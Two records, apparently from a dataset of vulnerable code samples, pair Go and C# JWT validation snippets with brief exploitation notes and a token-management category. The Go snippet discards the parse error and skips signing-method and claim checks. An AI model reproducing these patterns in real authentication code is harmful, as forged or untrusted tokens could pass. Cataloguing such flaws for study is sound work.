{"id": "vuln-999", "language": "Go", "vulnerability_type": "Insecure Token Validation", "code_snippet": "token, _ := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) { return secretKey, nil })", "exploitation_techniques": "Forge tokens with invalid issuer/audience.", "cwe_category": "Session & Token Management"}
{"id": "vuln-1000", "language": "C# (.NET)", "vulnerability_type": "Insecure Token Validation", "code_snippet": "new JwtSecurityTokenHandler().ValidateToken(token, new TokenValidationParameters { ValidateIssuerSigningKey = true, IssuerSigningKey = key }, out _);", "exploitation_techniques": "Use tokens from untrusted sources.", "cwe_category": "Session & Token Management"}
